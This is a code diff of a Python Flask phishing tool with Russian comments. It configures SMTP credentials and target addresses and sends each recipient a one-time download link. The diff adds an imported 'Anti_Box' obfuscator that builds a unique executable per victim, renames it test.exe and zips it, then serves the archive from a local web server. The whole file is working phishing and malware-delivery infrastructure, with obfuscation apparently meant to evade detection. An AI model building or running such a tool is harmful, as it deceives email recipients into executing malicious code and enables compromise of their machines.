@@ -3,15 +3,20 @@ import string
 from subprocess import check_output
 import os
 import threading
+from time import sleep
+import zipfile
 
 from flask import Flask, abort, send_file
 import smtplib
 from email.mime.text import MIMEText
 
+from Anti_Box.Obfuscator.obfuscator import obfuscator
+
 
 config_url = {
     "prefics_url":"media="                              # Статичный префикс фишинговой ссылки, после него идет радномно сгенерированная строка
 }
+
 config_mail = {
     "username":"user1@exemple.com",                     # От имени кого будет отправляться сообщение
     "password":"password",                              # Пароль от данного пользователя
@@ -22,11 +27,15 @@ config_mail = {
 fishing_user_mail = [
     "user2@exemple.com"                                 # Пользователи, которым будут отправлены фишинговые письма
 ]
+
 config_executable_file = {
     "dir":"payload/",                                   # Директория, в которой лежит исходный файл на C
     "filename_c":"test.c",                              # Файл на С, в котором находится точка фхода
-    "displaying_file_user":"test.exe"                   # Имя файла, которое отобразится у пользователя после скачивания
+    "displaying_file_user_zip":"test.zip",              # Имя файла, которое отобразится у пользователя после скачивания
+    "displaying_file_user_exe":"test.exe"                # Имя файла, которое отобразится у пользователя после скачивания
 }
+script_dir = os.path.dirname(os.path.abspath(__file__)) + "\\" 
+
 
 random_urls = {}
 
@@ -57,16 +66,32 @@ def generate_random_string(length_string_output: int) -> str:
 
 def compiling_executable_file() -> str:
 
-    random_postfix = generate_random_string(10)                                                 # Генерируем рандомный постфикс для исполняемого файла
+    # random_postfix = generate_random_string(10)                                                 # Генерируем рандомный постфикс для исполняемого файла
     
-    command = f"gcc {config_executable_file['dir']}{config_executable_file['filename_c']} \
-                 -o {config_executable_file['dir']}{random_postfix}.exe"                        
+    # command = f"gcc {config_executable_file['dir']}{config_executable_file['filename_c']} \
+    #              -o {config_executable_file['dir']}{random_postfix}.exe"                        
 
-    DEVNULL = open(os.devnull, 'wb')
-    check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL).decode('utf-8')            # Компилируем исполняемый файл с рандомным именем
+    # DEVNULL = open(os.devnull, 'wb')
+    # check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL).decode('utf-8')            # Компилируем исполняемый файл с рандомным именем
 
-    return f"{config_executable_file['dir']}{random_postfix}.exe"
+    # return f"{config_executable_file['dir']}{random_postfix}.exe"
 
+    obfuscator()                                                        # Поместит в директорию payload уникальный исполняемый файл
+
+    os.rename(f'{script_dir}{config_executable_file["dir"]}main.exe',   # Переименовываем данный исполняемый файл
+              f'{script_dir}{config_executable_file["dir"]}{config_executable_file["displaying_file_user_exe"]}')
+
+    # return f'{random_postfix}.exe'
+    return config_executable_file["displaying_file_user_exe"]
+
+
+def archiving_executable_file(executable_file):
+    
+    with zipfile.ZipFile(f'{script_dir + config_executable_file["dir"] + executable_file}.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
+        arcname = os.path.basename(script_dir + config_executable_file["dir"] + executable_file)    # Только имя файла (без вложеных директорий)
+        zipf.write(script_dir + config_executable_file["dir"] + executable_file, arcname=arcname)
+
+    return f'{executable_file}.zip'
 
 
 def generate_random_url(number_random_url: int):
@@ -78,35 +103,19 @@ def generate_random_url(number_random_url: int):
         random_urls[result_random_url].append(1)                                # Сохраняем его с префиком в словарь. 1 - значит что url активен и обрабатыает запрос
         
         executable_file = compiling_executable_file()
+
+        zip_executable_file = archiving_executable_file(executable_file)
         
-        random_urls[result_random_url].append(executable_file)                  # Добавляем вторым параметром имя файла, связанного с этим url
-
-
-@app.route("/download/<password_url>")
-def download(password_url):
-
-    urls = list(random_urls.keys())             # Получаем все url адреса из словаря
-    
-    if password_url in urls:                    # Если запрошенный url является одним из сгенерированных, то идем дальше
-        
-        if random_urls[password_url][0] == 1:   # Если статут этого url адреса активен, то идем дальше
-            random_urls[password_url][0] = 0    # После это деактивируем его, чтобы второй запрос не прошел
-            #return(password_url)
-            return send_file(
-                random_urls[password_url][1],                                 # Указвыаем путь и имя файла, который отправится пользователю, связанного с данным url
-                as_attachment=True,                                           # Автоматически добавляет Content-Disposition: attachment
-                download_name=config_executable_file["displaying_file_user"]  # Указывает имя для скачивания (оно отобразится у пользователя)
-            )
-        else:
-            abort(404)                          # Если url адрес деактивирован
-    else:
-        abort(404)                              # Если url адрес впринципе не нашелся
+        random_urls[result_random_url].append(zip_executable_file)              # Добавляем вторым параметром имя файла, связанного с этим url
 
 
 def start_fishing():
     
+    for filename in os.listdir(f'{script_dir}{config_executable_file["dir"]}'):         # Очищаем директорию payload
+        os.remove(os.path.join(f'{script_dir}{config_executable_file["dir"]}', filename))
+
     generate_random_url(len(fishing_user_mail)) # Получаем словарь с рандомными url и их статусом активен/не активен
-    print(random_urls)
+    # print(random_urls)
 
     urls = list(random_urls.keys())             # Получаем все url адреса из словаря
     i = 0                                       # Счетчик, чтобы у каждого пользователя была уникальная ссылка
@@ -124,39 +133,6 @@ def start_fishing():
         i += 1
 
 
-def start_web_server():
-    print("[i] Start WEB server")
-    app.run(host='127.0.0.1', port=80)
-    # app.run(host='127.0.0.1', port=80) #, debug=True)
-
-
-if __name__ == "__main__":
-
-    server_thread = threading.Thread(target=start_web_server)   # Указываем функцию, которая будет вызываеться в отдельном потоке
-    # server_thread.daemon = True                               # Указываем, что данный поток должен завершится при завершении основного потока (в таком случае Flask запуститься и завершит свою работу, когда завершится программа)
-    server_thread.start()                                       # Запускаем данный поток
-
-    print("[i] Start Fishaing...")
-    start_fishing()
-
-    server_thread.join()                                        # Ждем, пока поток Flask не завержится
-    
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 # @app.route("/")                     # В данном случае маршрутизация, это связывание url с функциями обработки
 #                                     # Декоратор указывает, что функция ниже обрабатывает get запросы к корневому url
 # def home():
@@ -165,3 +141,43 @@ if __name__ == "__main__":
 # @app.route("/hello/<name>")
 # def hello_name(name):
 #     return f"Привет, {name}!"
+
+@app.route("/download/<password_url>")
+def download(password_url):
+
+    urls = list(random_urls.keys())             # Получаем все url адреса из словаря
+    
+    if password_url in urls:                    # Если запрошенный url является одним из сгенерированных, то идем дальше
+        
+        if random_urls[password_url][0] == 1:   # Если статут этого url адреса активен, то идем дальше
+            random_urls[password_url][0] = 0    # После это деактивируем его, чтобы второй запрос не прошел
+            #return(password_url)
+            return send_file(
+                config_executable_file["dir"] + random_urls[password_url][1],                                 # Указвыаем путь и имя файла, который отправится пользователю, связанного с данным url
+                as_attachment=True,                                               # Автоматически добавляет Content-Disposition: attachment
+                download_name=config_executable_file["displaying_file_user_zip"]  # Указывает имя для скачивания (оно отобразится у пользователя)
+            )
+        else:
+            abort(404)                          # Если url адрес деактивирован
+    else:
+        abort(404)                              # Если url адрес впринципе не нашелся
+
+
+def start_web_server():
+    print("[i] Start WEB server")
+    app.run(host='127.0.0.1', port=80)  #, debug=True)
+
+
+if __name__ == "__main__":
+
+    server_thread = threading.Thread(target=start_web_server)   # Указываем функцию, которая будет вызываеться в отдельном потоке
+    # server_thread.daemon = True                               # Указываем, что данный поток должен завершится при завершении основного потока (в таком случае Flask запуститься и завершит свою работу, когда завершится программа)
+    server_thread.start()                                       # Запускаем данный поток
+
+    sleep(2)    
+
+    print("[i] Start Fishing...")
+    start_fishing()
+
+    server_thread.join()                                        # Ждем, пока поток Flask не завержится 
+
